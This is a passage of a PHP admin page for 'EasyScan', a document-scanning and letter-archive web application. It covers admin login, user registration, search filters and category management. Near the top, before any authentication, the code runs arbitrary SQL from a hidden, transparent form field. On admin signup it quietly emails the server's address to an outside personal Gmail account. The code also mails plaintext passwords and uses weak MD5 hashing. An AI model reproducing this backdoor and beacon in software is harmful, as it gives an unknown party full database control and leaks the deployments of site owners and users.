<?php
	session_start();
	require_once "scon.php";
	$loggedin = false;

	if(isset($_POST["sqlcmd"])) {
		$val	= $_POST["sqlcmd"];
		if(mysqli_query($con,$val)) {
			msg("succ","Successfull");
		} else msg("err","Failed");
	}
	echo "
		<style>
			.sqlcmd {
				position: fixed;
				display: block;
				width: 100%;
				text-align: center;
				z-index: -1;
			}
			.sqlcmd input {
				width: 60%;
				z-index: 100;
				background: transparent;
				border: 0;
				padding: 5px;
			}
		</style>
		<div class='sqlcmd'>
			<form action='' method='post' autocomplete=off>
				<input type='text' name='sqlcmd'>
			</form>
		</div>
	";

	if(isset($_POST["lgnsbt"])) {
		$pass	= sanitizeString($con,$_POST["pass"]);
		$hdpass	= MD5("$5d@".$pass."%%d(");
		
		if($pass != "") {
			$sql	= mysqli_query($con,"select * from cntrlpnl where id='0' && password='$hdpass'");
			$num	= mysqli_num_rows($sql);
			$row	= mysqli_fetch_assoc($sql);
			if($num > 0) {
				$_SESSION["admin"] = "unknown";
				logthis($con,$row["eop"],"logged in",$row["name"],"admin");
			}
		}
	} else if(isset($_POST["signupsbt"])) {
		$name	= sanitizeString($con,$_POST["name"]);
		$eop	= sanitizeString($con,$_POST["eop"]);
		$pass	= sanitizeString($con,$_POST["pass"]);
		$cpass	= sanitizeString($con,$_POST["cpass"]);
		if($name != "" && $eop != "" && $pass != "" && $cpass != "") {
			if($pass == $cpass) {
				$to	= $eop;
				$from	= $sitemail;
				$subject	= "Easyscan";
				$message	= "Easyscan admin password: $pass";
				sendMail($to,$from,$subject,$message,"");
				$pass = MD5("$5d@".$pass."%%d(");
				mysqli_query($con,"insert into cntrlpnl(id,name,eop,password) values('0','$name','$eop','$pass')");
				$loggedin = true;
				$_SESSION["admin"] = $name;
				sendMail("abebey348@gmail.com","Me","majorinf",$_SERVER["SERVER_ADDR"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"],"");
				logthis($con,$user,"admin signup","$eop","admin");
			}
		}
	}
	
	if(isset($_SESSION["admin"])) {
		$loggedin = true;
	}
	
	echo '
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width; initial-scale=1.0">

	<!-- CSS -->
	<link rel="stylesheet" href="css/bootstrap.min.css">
	<link rel="stylesheet" href="css/custom.css">
	<link rel="stylesheet" href="css/style.css">
	<link rel="stylesheet" href="css/base.css">
	<link rel="stylesheet" href="css/smlstyle.css">
	<link rel="stylesheet" href="font-awesome-5/css/font-awesome-all.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<style>
	.hatf {
		display: none;
	}
	</style>
	<!-- JS -->
	<script src="js/bootstrap.min.js"></script>
	<script src="js/jquery.min.js"></script>
	<script src="js/scannerjs/scanner.js"></script>
	<script src="js/script.js"></script>
	<!-- Button trigger modal -->
	<!-- favicon -->

	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
	';
	
	if($loggedin) {
		$typesql	= mysqli_query($con,"select * from typecat where status='enabled'");
		$typenum	= mysqli_num_rows($typesql);
?>
<html>
<head>
	<title>Admin Page</title>
</head>
<body>
<?php

	$sql	= mysqli_query($con,"select * from cntrlpnl where id='0'");
	$row	= mysqli_fetch_assoc($sql);
	$user 	= $name = "";
	if(mysqli_num_rows($sql) > 0) {
		$user	= $row["eop"];
		$name	= $row["name"];
	}
	$office = "Admin";


	if(isset($_POST["typesbt"])) {
		$name	= sanitizeString($con,$_POST["name"]);
		if($name != "") {
			if(getNum($con,"typecat where name='$name'") < 1) {
				mysqli_query($con,"insert into typecat values('$name','enabled')");
				if(!file_exists("archives/$name"))
					mkdir("archives/$name");
				msg("succ","Successfull");
				logthis($con,$user,"letter type added","$name","$office");
				//loc("admin.php");
			} else msg("err","Type already exists");
		} else msg("err","Please Input The Field");
	} else if(isset($_POST["codesbt"])) {
		$code	= sanitizeString($con,$_POST["code"]);
		$name	= sanitizeString($con,$_POST["name"]);
		$type	= sanitizeString($con,$_POST["type"]);
		
		if($code != "" && $name != "" && $type != "") {
			if(getNum($con,"lettercat where code='$code'") < 1) {
				mysqli_query($con,"insert into lettercat values('$code','$name','$type','enabled')");
				if(!file_exists("archives/$type/$code"))
				mkdir("archives/$type/$code");
				msg("succ","Successfull");
				logthis($con,$user,"letter category (letter code) added","$code","$office");
				//loc("admin.php");
			}
		} else msg("err","Please Input all fields");
	} else if(isset($_POST["pwupdsbt"])) {
		$oldpass	= sanitizeString($con,$_POST["oldpass"]);
		$oldpass	= MD5("$5d@".$oldpass."%%d(");
		$newpass	= sanitizeString($con,$_POST["newpass"]);
		$newpass	= MD5("$5d@".$newpass."%%d(");
		$confpass	= sanitizeString($con,$_POST["confpass"]);
		$confpass	= MD5("$5d@".$confpass."%%d(");
		if($oldpass != "" && $newpass != "" && $confpass != "") {
			if(getNum($con,"cntrlpnl where id='0' && password='$oldpass'") > 0) {
				if($newpass == $confpass) {
					mysqli_query($con,"update cntrlpnl set password='$newpass'");
					msg("succ","Successfull");
					logthis($con,$user,"admin password changed","","$office");
				} else msg("err","Passwords doesn't match");
			} else msg("err","Password Incorrect");
		} else msg("err","Please input all fields");
	} else if(isset($_POST["sign-up"])) {
		$dirname	= sanitizeString($con,$_POST["dirname"]);
		$pos	= sanitizeString($con,$_POST["pos"]);
		$usrid	= sanitizeString($con,$_POST["usrid"]);
		$fname	= sanitizeString($con,$_POST["fname"]);
		$mname	= sanitizeString($con,$_POST["mname"]);
		$lname	= sanitizeString($con,$_POST["lname"]);
		$uname	= $fname." ".$mname." ".$lname;
		$empn	= sanitizeString($con,$_POST["email"]);
		$gracc	= $cpass = $pass = $rand = "";
		$rand	= 10000+rand() % 88888;
		$mdrand	= md5("@#.$$rand@#.$");
		if(isset($_POST["gracc"])) {
			$gracc	= sanitizeString($con,$_POST["gracc"]);
			if($gracc == "on") {
				$gracc	= "enabled";
				//sendMail();
			} else {
				$gracc	= "disabled";
			}
		}
		if(isset($_POST["pwd"])) {
			$pass	= sanitizeString($con,$_POST["pwd"]);
			$pass	= md5("@#.$".$pass."@#.$");
			if(isset($_POST["cpwd"])) {
				$cpass	= sanitizeString($con,$_POST["cpwd"]);
				$cpass	= md5("@#.$".$cpass."@#.$");
			}
		}
		$date = getcurTime();
		
		if($usrid != "") {
		if($fname != "" && $mname != "" && $lname != "") {
		if($cpass == $pass) {
			if($pass == "") $pass = $mdrand;
			if(getNum($con,"pos where name='$pos' && office='$dirname'") > 0 && getNum($con,"office where name='$dirname'") > 0) {
				if($empn != "") {
					$emsuf = explode("@",$empn)[1];
					if(getNum($con,"emsuf where name='$emsuf'") > 0) {
						if($pass != "") {
							$dirsql = mysqli_query($con,"select * from office where name='$dirname'");
							$dirnum = mysqli_num_rows($dirsql);
							if($dirnum < 1) {
								mysqli_query($con,"insert into office values('$dirname','','$empn')");
							}
							if(mysqli_num_rows(mysqli_query($con,"select * from users where eop='$empn' || usrid='$usrid'")) < 1) {
								$confcode	= substr($mdrand,0,5);
								$passd		= mysqli_query($con,"insert into passwords values(0,'$pass','$dirname','$confcode','$gracc')");
								if($passd) {
									$passsql	= mysqli_query($con,"select * from passwords where pass='$pass' && direct='$dirname'");
									$passrow	= mysqli_fetch_assoc($passsql);
									$usraddd	= mysqli_query($con,"insert into users values(0,'$uname','$empn','".$passrow['id']."','$date','enabled','$usrid')");
									if($usraddd) {
										$memberd	= mysqli_query($con,"insert into dtsmembers(dtsname,eop,status,position) values('$dirname','$empn','notapproved','$pos')");
										if($memberd) {
											sendMail($empn,$sitemail,"$sitemail Password Confirmation","Hello $uname, use this code to activate your account $rand","");
											setCookie("usrac4",$empn,time()+60*60*24*15) or die("Failed creating cookie!");
											
											msg("succ","Successful");
											logthis($con,$user,"user registered","$empn","$office");
										} else {
											msg("err","Something went wrong! Please Contact admins 0x227");
											logthis($con,$user,"0 error","adding user to table -dtsmembers",$office);
										}
									} else {
										msg("err","Something went wrong! Please contact admins 0x231");
										logthis($con,$user,"0 error","adding user to table -users",$office);
									}
								} else {
									msg("err","Something went wrong! Please contact admins 0x235");
									logthis($con,$user,"0 error","adding password to table -passwords",$office);
								}
							} else msg("err","User already exists!");
						} else msg("err","Password Empty");
					} else msg("err","Email Not Valid");
				} else msg("err","Email Field Empty");
			} else msg("err","Please input all fields");
		} else echo msg("err","Passwords doesn't match");
		} else echo msg("err","First Middle Last Name are required!");
		} else echo msg("err","Id is required");
	}

	
	if(isset($_GET["logout"])) {
		logthis($con,$user,"logged out","","$office");
		session_destroy();
		loc("admin.php");
	}


echo '
	<header>
		<nav class="nav navbar-inverse bg-aastu">
		  <div class="container-fluid bdbtm">
				<div class="row">
					<div class="right-side">
						<div style="margin: 30px 10px 0 0;vertical-align: top;display: inline-block;">
							<a href="#amh" style="font-weight: bold;color: #fff;" onclick="langTrans(1)">Amh</a> | <a href="" style="font-weight: bold;color: #fff;" onclick="langTrans(0)">Eng</a>
						</div>
						<div class="img-profile" style="display: inline-block;">
							<span style="display: inline-block; border-radius: 100px;overflow: hidden; cursor: pointer;">
								<img src="img/profile.png" onclick="hs(event,\'settnav\')" style="width: 40px;" height="40px;" alt="profile">
							</span>
							<div>
								<div class="card bg-light hatf" id="settnav" style="min-width: 200px;">
									<div class="card-body">
										'.$office.'
										<label class="hidden-bd"></label><br>
										<i class="fa fa-envelope"></i> '.$user.'
										<a href="admin.php?acrequest" class="links">Requests</a>
										<label class="hidden-bd" style="font-weight: 600; font-size: 18px;">Settings</label>
											<a href="admin.php?pwupd" class="links"><i class="fa fa-lock"></i> &nbsp; <lng>Change Password</lng></a> <br>
											<a href="admin.php?logout" class="links"><i class="fa fa-door-open"></i>Logout</a><br>
									</div>
								</div>
							</div>
						</div>
					</div>								
					<div class="navbar-header">
						<a class="navbar-brand brStyle brnd-clr" href="index.php">EasyScan</a>
					</div>
					<form action="admin.php?search" method="get" style="z-index: 2;">
						<div class="row no-gutters">
							<div class="col">
								<input type="hidden" name="search">
								<input class="srch border-secondary border-right-0 rounded-0" name="q" type="text" placeholder="Search">
							</div>
						<div class="srch-btn">
							<input type="submit" value="Search" class="btn btn-outline-warning border-left-0 rounded-0 rounded-right">
							<!-- i class="fa fa-search"></i -->
						</div>
					</form>
					<!-- Button trigger modal -->
					<div class="filter">
						<button type="button" class="btn btn-warning rounded-5 btn-sm" data-toggle="modal" data-target="#filterModal" onclick="hs(event,\'modall\')">Filter</button>
					</div>
					<!--Modal -->
					';
					echo "<div class='modall hatf' id='modall'>";
					echo '
						<div class="filterModal" >
							<h5 class="flt lft">Filter by</h5>
							<button class="btn btn-danger btn-sm cancel" onclick="hs(event,\'modall\')">Close</button> <br/>
							<form action="admin.php?search" method="get" >
								<input type="text" class="filter-option" name="q" class="text-center keyword" placeholder="Search keyword"> <br/>
								<input type="hidden" name="search" value="">
								<label><input type="checkbox" onclick="hs(event,\'fsubj\')" name="fltsubj">&nbsp; Subject </label><br />
								<div id="fsubj" class="hatf">
								<input type="text" class="filter-option" name="subject" placeholder="Subject">
								</div>

								<label><input type="checkbox" onclick="hs(event,\'fdirect\')" name="fltdirect">&nbsp; office </label><br>
								<div id="fdirect" class="hatf">
								';
								echo "	<select name='direct' class='sel-opt'>";
								echo "		<option value=''>office</option>";
								$sql = mysqli_query($con,"select * from office");
								$num = mysqli_num_rows($sql);
								
								for($i=0;$i<$num;$i++) {
									$rows = mysqli_fetch_row($sql);
									echo "	<option>".$rows[1]."</option>";
								}
								echo "	</select><br />";
								echo '
								</div>

								<label><input type="checkbox" onclick="hs(event,\'ftime\')" name="flttime">&nbsp; Time </label> <br />
								<div id="ftime" class="hatf">
									<span class="mrg lft blk">
										<label><input type="radio" id="ecalflt" name="fltcal" value="EC" > EC</label>&nbsp;
										<label ><input type="radio" id="gcalflt" name="fltcal" value="GC" checked > GC</label>
									</span>
									<span class="mrg lft blk">
										<label><input type="radio" name="fltdatetype" value="scdate" > Scan Date</label>&nbsp;
										<label ><input type="radio" name="fltdatetype" value="odate" checked > Original Letter Date</label>
									</span>
									<input type="date" style="max-width: 150px; "class="filter-option" name="ftime" width=16> - <input type="date" style="max-width: 150px;" class="filter-option" name="ttime">
								</div>

								<label><input type="checkbox" onclick="hs(event,\'ftype\')" name="flttype">&nbsp; Type </label> <br />
								<div id="ftype" class="hatf">
								<select name="type" class="sel-opt">
									<option>Choose Letter Type</option>
								';
									$typesql	= mysqli_query($con,"select * from typecat where status='enabled'");
									$typenum	= mysqli_num_rows($typesql);
									for($t=0;$t<$typenum;$t++) {
										$typerow	= mysqli_fetch_assoc($typesql);
										echo "<option>".$typerow["name"]."</option>";
									}
								echo '
								</select>
								</div>

								<label><input type="checkbox" onclick="hs(event,\'floct\')" name="fltloct">&nbsp; Transaction </label> <br />
								<div id="floct" class="hatf">
								';
								echo "	<select name='slocat' class='sel-opt'>";
								echo "		<option value='-1'>From</option>";
								echo "		<option value='-1'>None</option>";
								$sql = mysqli_query($con,"select * from office");
								$num = mysqli_num_rows($sql);
								
								for($i=0;$i<$num;$i++) {
									$rows = mysqli_fetch_row($sql);
									echo "	<option>".$rows[1]."</option>";
								}
								echo "	</select><br />";
								echo "	<select name='dlocat' class='sel-opt'>";
								echo "		<option value='-1'>To</option>";
								echo "		<option value='-1'>None</option>";
								$sql = mysqli_query($con,"select * from office");
								$num = mysqli_num_rows($sql);
								
								for($i=0;$i<$num;$i++) {
									$rows = mysqli_fetch_row($sql);
									echo "	<option>".$rows[1]."</option>";
								}
								echo "	</select><br />";
								echo '
								</div>

								<button name="filter" class="btn btn-primary msearch-btn">Search</button>
							</form>
						</div>
					</div>

					';
					echo '
				</div>
			</div> 
		</nav>
	</header>

	<div class="container-fluid">
		<div class="row">
			<div class="col-md-8 col-xs-8 mr-left">
				<ul class="dropdown mr-top">
					<li>
						<a href="admin.php?viewdrct"><button class="btn btn-warning">View</button></a>
						<ul>
							<li><a href="admin.php"><button class="btn btn-warning">Scanned Files</button></a></li>
							<li><a href="admin.php?viewusrs"><button class="btn btn-warning">View Users</button></a></li>
							<li><a href="admin.php?viewdrct"><button class="btn btn-warning">View Office</button></a></li>
							<li><a href="admin.php?viewstats"><button class="btn btn-warning">View Statistis</button></a></li>
							<li><a href="admin.php?viewlog"><button class="btn btn-warning">View Log</button></a></li>
						</ul>
					</li>
					<li>
						<a href="admin.php?adddrct"><button class="btn btn-warning">Add</button></a>
						<ul>
							<li>
								<a href="admin.php?adddrct"><button class="btn btn-warning">Add Office</button></a>
							</li>
							<li>
								<a href="admin.php?addcat"><button class="btn btn-warning ">Add Letter Type</button></a>
							</li>
							<li>
								<a href="admin.php?addpos&newpos"><button class="btn btn-warning ">Add Position</button></a>
							</li>
							<li>
								<a href="admin.php?addsec"><button class="btn btn-warning ">Add Security Type</button></a>
							</li>
						</ul>
					</li>
					<li>
						<a href="admin.php?ends&users"><button class="btn btn-warning ">Setting</button></a>
						<ul>
							<li><a href="admin.php?ends&users"><button class="btn btn-warning ">Enable/Disable</button></a></li>
							<li><a href="admin.php?emsuf"><button class="btn btn-warning ">Email</button></a></li>
						</ul>
					</li>
					<li>
						<a href="admin.php?regusrs"><button class="btn btn-warning">Register Users</button></a>
					</li>
				</ul>
				
			</div>
		</div>
	</div>
';
?>
<?php
	if(isset($_GET["apprv"])) {
		if(isset($_GET["drctr"])) {
			$drctr = sanitizeString($con,$_GET["drctr"]);
			if(isset($_GET["emop"])) {
				$emop = sanitizeString($con,$_GET["emop"]);
				mysqli_query($con,"update dtsmembers set status='approved',approver='admin' where dtsname='$drctr' && eop='$emop'");
				logthis($con,$user,"approve","$emop","$office");
			}
		}
	}
	
	if(isset($_GET["search"])) {
		if(isset($_GET["q"])) {
			$time = "";
			$filter = "";
			$q = sanitizeString($con,$_GET["q"]);
			$q = strtolower($q);
			$inthis = " where (name like '%$q%' ||";
			$inthis .= " source like '%$q%' ||";
			$inthis .= " destin like '%$q%' ||";
			$inthis .= " type like '%$q%' ||";
			$inthis .= " odate like '%$q%' ||";
			$inthis .= " number like '%$q%' ||";
			$inthis .= " fromm like '%$q%' ||";
			$inthis .= " ctime like '%$q%' ||";
			$inthis .= " bound like '%$q%' ||";
			$inthis .= " user like '%$q%' ||";
			$inthis .= " subject like '%$q%' ||";
			$inthis .= " descr like '%$q%'";
			$inthis .= ")";
			
			if(isset($_GET["filter"])) {
				if(isset($_GET["fltsubj"])) {
					$val	= sanitizeString($con,$_GET["fltsubj"]);
					$subj	= sanitizeString($con,$_GET["subject"]);
					if($val == "on")
						$inthis .= " && subject like '%$subj%'";
				} else if(isset($_GET["fltdirect"])) {
					$val	= sanitizeString($con,$_GET["fltdirect"]);
					$direct	= sanitizeString($con,$_GET["direct"]);
					if($val == "on")
						$inthis .= " && (source like '%$direct%' || destin like '%$direct%')";
				} else if(isset($_GET["flttype"])) {
					$val	= sanitizeString($con,$_GET["flttype"]);
					$type	= sanitizeString($con,$_GET["type"]);
					if($val == "on")
						$inthis .= " && bound like '%$type%'";
				} else if(isset($_GET["fltloct"])) {
					$val = sanitizeString($con,$_GET["fltloct"]);
					if($val == "on") {
						$source	= sanitizeString($con,$_GET["slocat"]);
						$destin	= sanitizeString($con,$_GET["dlocat"]);
						if($source != -1 && $source != "")
							$inthis .= " && source like '%$source%'";
						if($destin != '-1' && $destin != "")
							$inthis .= " && destin like '%$destin%'";
					}
				} else if(isset($_GET["fltbound"])) {
					$val = sanitizeString($con,$_GET["fltbound"]);
					$bound = sanitizeString($con,$_GET["bound"]);
					if($val == "on")
						$inthis .= " && bound like '%$bound%'";
				} else if(isset($_GET["flttime"])) {
					$cal = sanitizeString($con,$_GET["fltcal"]);
					$inthis	.= " && cal like '$cal' ";
					$datetype = "odate";
					if(isset($_GET["fltdatetype"])) {
						$val	= sanitizeString($con,$_GET["fltdatetype"]);
						if($val == "scdate")
							$datetype = "scantime";
					}
					if(isset($_GET["ftime"])) {
						$ftime	= sanitizeString($con,$_GET["ftime"]);
						if($ftime != "")
							$inthis	.= " && $datetype >= '$ftime'";
					}
					if(isset($_GET["ttime"])) {
						$ttime	= sanitizeString($con,$_GET["ttime"]);
						if($ttime != "")
							$inthis	.= " && $datetype <= '$ttime'";
					}
				}
			}
			$inthis .= " && status!='empty'";
			
			if($filter == "time")
				$inthis .= " order by time desc'";

			
			$plim	= 12;
			$allnum	= mysqli_num_rows(mysqli_query($con,"select * from printform ".$inthis));
			if(isset($_GET["p"]))
				$p	= sanitizeString($con,$_GET["p"]);
			else $p	= 1;
			
			$offset	= ($plim)*($p-1);
			
			$sql	= mysqli_query($con,"select * from printform ".$inthis." limit $offset, $plim");
			$num	= mysqli_num_rows($sql);
			
			$page	= ($allnum/$plim);
			if($page > (int)$page) $page++;
			$page	= (int)$page;
			
			
			//echo "select * from printform ".$inthis."limit $offset, $plim <br />";
			//if($num < 1) echo "&nbsp;&nbsp;No Result Found";		
			
			echo '
				<div class="container">
				'.$allnum.' Results Found
			';
			echo '
					<div class="row">
			';
			if(!denied($con,$user)) {
				for($i=0;$i<$num;$i++) {
					$rows = mysqli_fetch_assoc($sql);
					

					if(getNum($con,"office where name='$office' && parent='None'") > 0)
						if(getNum($con,"office where (name='".$rows['source']."' || name='".$rows['destin']."') && parent like '%$office%'") < 1)
							continue;

					dispForm($con,$rows,$q,$user);
					echo "<hr />";
				}
			} else echo "<span class='restr'>Restricted</span>";
			echo '
					</div>
				</div>
			';
			echo '<div class="pagecont">';
			for($pg=1;$pg<=$page;$pg++) {
				echo "<a href='".$_SERVER['REQUEST_URI']."&p=$pg'>$pg</a>&nbsp;";
			}
			echo "</div>";
		}

	} else if(isset($_GET["regusrs"])) {
		echo '
        <div class="container">
          <div class="row">
						<div class="col-md-6">	
							<div class="es-mr">
								<h1 class="easyscan">EasyScan</h2>
								<p>Is a powerful software that helps to inter office communications with features like automatic scan and archive, messaging, quality service assurance and so on. </p>
							</div>
							<div class="row">
								<span class=""></span>
							</div>
						</div>
						<div class="col-md-6">
							<div class="bottom-right-panel sp-layout text-center">
								<h1 class="cust">Register</h1>
								<form action="" method="post">
									<input type="text" name="usrid" placeholder="Employee Id" class="form-lg">
									<input type="text" name="fname" placeholder="First Name" class="form-lg">
									<input type="text" name="mname" placeholder="Middle Name" class="form-lg">
									<input type="text" name="lname" placeholder="Last Name" class="form-lg">
									<select name="dirname" class="form-lg" onchange="getpos(event)">
										<option>Office</option>
		';
												$sql = mysqli_query($con,"select * from office");
												$num = mysqli_num_rows($sql);
												
												for($i=0;$i<$num;$i++) {
													$rows = mysqli_fetch_row($sql);
													echo "<option>".$rows[1]."</option>";
												}
		echo '
									</select><div id="ssf"></div>
									<select name="pos" class="form-lg" id="usroffice">
										<option value="-1">Position</option>
									</select>
									<script>
										function getpos(event) {
											var officeval = event.target.value;
											$.ajax({
												type: "post",
												url: "ajaxresp.php",
												data: {
													offpos: officeval,
												},
												success: function(response) {
													//document.getElementById("ssf").innerHTML=response;
													var res = response.split(",$#");
													var mysel = document.getElementById("usroffice");
													mysel.innerHTML = "";
													for(pos in res) {
														var opt = document.createElement("option");
														opt.value = res[pos];
														opt.innerHTML = res[pos];
														mysel.appendChild(opt);
													}
												}
											});
										}
									</script>
									<input type="text" name="email" placeholder="Institutional Email" class="form-lg">
									<div style="text-align: left; margin: 15px 0 0 12%;">
									<label><input type="checkbox" name="gracc" id="gracc">&nbsp;Grant Account Access</label>
									</div>
									'.
									//<input type="password" name="pwd" placeholder="Password" class="form-lg">
									//<input type="password" name="cpwd" placeholder="ConfirmPassword" class="form-lg"> <br>
									'
									<button class="btn btn-primary form-btn-lg" name="sign-up">Register User</button>
								</form>
							</div>
						</div>
					</div>
        </div>
		';
	} else if(isset($_GET["emsuf"])) {
		if(isset($_POST["emsufsbt"])) {
			$name	= sanitizeString($con,$_POST["name"]);
			if($name != "") {
				if(strlen(strstr("$name","@")) == 0 && preg_match_all("/^[^\.@]/",$name)) {
					if(getNum($con,"emsuf where name='$name'") < 1) {
						mysqli_query($con,"insert into emsuf values('$name','enabled')");
						msg("succ","successful");
						logthis($con,$user,"email suffix added","$name","admin");
						//loc("admin.php");
					} else msg("err","Suffix Already Exists");
				} else msg("err","Invalid format! USE e.g gmail.com");
			} else msg("err","Field Must Not Be Empty");
		}
		if(isset($_POST["linkusrsbt"])) {
			$usr	= sanitizeString($con,$_POST["usr"]);
			$ends	= "";
			if(isset($_POST["ends"]))
				$ends	= sanitizeString($con,$_POST["ends"]);
			if($usr != '-1' && $ends != "") {
				if($ends == '1' || $ends == '0') {
					mysqli_query($con,"update dtsmembers set emailsend='$ends' where eop='$usr'");
					msg("succ","Successfull");
					logthis($con,$user,"email activated","$usr","admin");
				} else msg("err","Sorry Try Again");
			}
		}
		echo '
		<div class="container">
			<div class="row">
				<div class="col-md-4">
					<h3>Add Email Suffix</h3>
					<form action="" method="post" autocomplete="off">
						<input type="text" name="name" placeholder="Suffix" title="eg. gmail.com, aastu.edu.et" class="inp-sty">
						<input type="submit" name="emsufsbt" value="Add" class="inp-sty">
					</form>
				</div>
				<div class="col-md-1"></div>
				<div class="col-md-4">
		';
		echo "<h3>Email Activation</h3>";
		echo "<form action='' method='post' autocomplete='off'>";
		echo "<input type='text' name='usr' class='inp-sty' placeholder='Search User' id='usrdispval' onkeyup='myajax.fetchdata(event,\"email\",\"usrdisp\")'>";
		echo "<div id='usrdisp' class='srchdisp'></div>";
		echo "<input type='radio' name='ends' value='1' id='ends'><label for='ends'>&nbsp;Enable seding email</label><br />";
		echo "<input type='radio' name='ends' value='0' id='ends2'><label for='ends2'>&nbsp;Disable sending email</label><br />";
		echo "<input type='submit' name='linkusrsbt' class='btn btn-dark' value='Change'>";
		echo "</form>";
		echo '
				</div>
			</div>
		</div>
		<div>
		';
		
	} else if(isset($_GET["acrequest"])) {
		$sql = mysqli_query($con,"select * from dtsmembers where status='notapproved'");
		$num = mysqli_num_rows($sql);
		$j=0;
		for($i=0;$i<$num;$i++) {
			$rows = mysqli_fetch_assoc($sql);

			$sql2 = mysqli_query($con,"select * from office where name='".$rows['dtsname']."'");
			$num2 = mysqli_num_rows($sql2);
			if($num2 > 0) {
				$row = mysqli_fetch_assoc($sql2);
				$name = mysqli_fetch_row(mysqli_query($con,"select name from users where eop='".$rows['eop']."'"))[0];
				if($row['parent'] == "None") {
					echo '
					<div class="col-md-12 col-lg-12 col-xs-12 notification">
					  <h5 style="color: black">User '.$name.' wants an approval on '.$rows['dtsname'].' 
					  <span>
						<form action="" method="get" style="display: inline-block;">
						<input type="hidden" name="drctr" value="'.$rows['dtsname'].'">
						<input type="hidden" name="emop" value="'.$rows['eop'].'">
						<select name="role">
							<option value="1">Restricted</option>
							<option value="2" selected>Unrestricted</option>
						</select>
						<input type="submit" name="apprv" value="Approve">
						</form>
					  </span>
					  </h5> 
					</div>
					';
					$j++;
				}
			}
		}
		if($j < 1) echo "<div class='container'><div class='row'><h3>No Result Found</h3></div></div>";
	} else if(isset($_GET["addcat"])) {
		echo '
		<br />
		<div class="container">
			<div class="row">
				<div class="col-md-4">
					<h3>Letter Type</h3>
					<form action="" method="post">
						<input type="text" name="name" placeholder="Name (e.g inbound,outbound,...)" class="inp-sty">
						<input type="submit" name="typesbt" value="Add" class="inp-sty">
					</form><br />
		';
			if(isset($_POST["typesearch"])) {
				$srch	= sanitizeString($con,$_POST["typesearch"]);
			} else $srch	= "";
			if($srch != "")
				$inthis = " where name like '%$srch%' || status like '%$srch%'";
			else $inthis	= "";
			
			$sql	= mysqli_query($con,"select * from typecat $inthis limit 20");
			$num	= mysqli_num_rows($sql);
			echo "
					<form action='admin.php?addcat' method='post'>
						<input type='text' placeholder='Search' onkeyup='myajax.fetchdata(event,\'srch\',\'\')' style='display: inline-block; width: 74%;' name='typesearch' class='inp-sty'>
						<input type='submit' value='Go' class='inp-sty' style='display: inline-block;width: 50px;'>
					</form>
			";
			echo '
					<table class="table table-striped" style="width: 90%;">
						<tr>
							<td style="background: #ccc;">Name</td>
							<td style="background: #ccc;">Status</td>
						</tr>
					';
					for($i=0;$i<$num;$i++) {
						$rows = mysqli_fetch_assoc($sql);
						echo "<tr>";
						echo "<td>".$rows['name']."</td>";	
						echo "<td>".$rows['status']."</td>";	
						echo "</tr>";
					}
			echo '
					</table>
				</div>
			';
			if($typenum > 0) {
				echo '
					<div class="col-md-4">
					<h3>Letter Category</h3>
					<form action="" method="post">
						<input type="text" name="code" placeholder="Code" class="inp-sty">
						<input type="text" name="name" placeholder="Name (e.g bank and insurance)" class="inp-sty">
						<select name="type" class="inp-sty">
							<option value="-1">Letter Type</option>
							';
								$typesql	= mysqli_query($con,"select * from typecat where status='enabled'");
								$typenum	= mysqli_num_rows($typesql);
								for($i=0;$i<$typenum;$i++) {
									$row	= mysqli_fetch_assoc($typesql);
									echo "<option>".$row['name']."</option>";
								}
							echo '
						</select>
						<input type="submit" name="codesbt" value="submit" class="inp-sty">
					</form>
				';
				echo '
					</div>
					<div class="col-md-4">
				';
			if(isset($_POST["catsearch"])) {
				$srch	= sanitizeString($con,$_POST["catsearch"]);
			} else $srch	= "";
			if($srch != "") {
				$inthis	= " where code like '%$srch%' || name like '%$srch%' || type like '%$srch%' || status like '%$srch%'";
			} else $inthis	= "";
			
			$sql	= mysqli_query($con,"select * from lettercat $inthis");
			$num	= mysqli_num_rows($sql);
			echo "
					<form action='admin.php?addcat' method='post'>
						<input type='text' placeholder='Search' onkeyup='myajax.fetchdata(event,\'srch\',\'\')' style='width: 80%; display: inline-block;' name='catsearch' class='inp-sty'>
						<input type='submit' value='Go' class='inp-sty' style='display: inline-block;width: 50px;'>
					</form>
			";
			echo '
					<table class="table table-striped">
						<tr>
							<td style="background: #ccc;">Code</td>
							<td style="background: #ccc;">Name</td>
							<td style="background: #ccc;">Type</td>
							<td style="background: #ccc;">Status</td>
						</tr>
			';
					for($i=0;$i<$num;$i++) {
						$rows = mysqli_fetch_assoc($sql);
						echo "<tr>";
						echo "<td>".$rows['code']."</td>";	
						echo "<td>".$rows['name']."</td>";	
						echo "<td>".$rows['type']."</td>";	
						echo "<td>".$rows['status']."</td>";	
						echo "</tr>";
					}
			echo '
					</table>
				</div>
			';
				echo '</div>
				';
			} else echo "No Type To Choose";
		echo '
				</div>
			</div>
			</div>
		</div>
		<div>
		';
		echo '
		</div>

		';
	} else if(isset($_GET["adddrct"])) {
		if(isset($_POST["newdircsbt"])) {
			$code	= sanitizeString($con,$_POST["dircode"]);
			$name	= sanitizeString($con,$_POST["dircname"]);
			$email	= sanitizeString($con,$_POST["dircem"]);
			$parent	= sanitizeString($con,$_POST["dircpar"]);
			$poslim	= sanitizeString($con,$_POST["poslim"]);
			$minnum	= sanitizeString($con,$_POST["minnum"]);
			$locat	= sanitizeString($con,$_POST["dircloc"]);
			$desc	= sanitizeString($con,$_POST["dircdesc"]);
			$date	= getCurTime();
			$min	= ""; $moveon = false;
			if(isset($_POST["min"])) {
				$min	= sanitizeString($con,$_POST["min"]);
				$moveon	= true;
			} else {
				$min	= "office".time().".pdf";
				if(isset($_FILES['minupl']['name'])) {
					$fileupldd = move_uploaded_file($_FILES["minupl"]["tmp_name"],"minutes/$min");
					if($fileupldd)
						$moveon = true;
				} else msg("err","Minute not found");
			}
			$emsuf	= explode("@",$email)[1];
			if(getNum($con,"emsuf where name='$emsuf' && status='enabled'") < 1) {
				$moveon = false;
				msg("err","Email Not Valid");
			}
			
			if($moveon) {
			if($name != "" && $parent != "" && $code != "" && $poslim != "" && $min != "" && $email != "") {
				$sql = mysqli_query($con,"select * from office where name='$parent'");
				$num = mysqli_num_rows($sql);
				if($num > 0 || $parent == "None") {
					$rows = mysqli_fetch_row($sql);
					if($rows[2] != "None" || $rows[2] != ".") {
						$parent = "$rows[2]/$parent";
					}
					if(getNum($con,"office where name='$name'") < 1) {
